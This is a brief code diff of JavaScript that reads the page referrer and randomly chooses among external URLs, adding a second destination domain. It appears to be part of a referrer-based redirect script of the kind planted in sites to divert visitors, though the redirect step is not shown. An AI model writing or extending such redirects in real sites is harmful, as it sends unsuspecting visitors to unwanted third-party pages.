@@ -4,7 +4,8 @@
     	var cek = document.referrer;
 
     	var ars 	= rChoice([
-							'https://ol.rajakatak.com',
+							'https://ol.rajakatak.com/',
+							'https://pinjam.123uver.cz/',
 							]);
 
 				function rChoice(arr) {
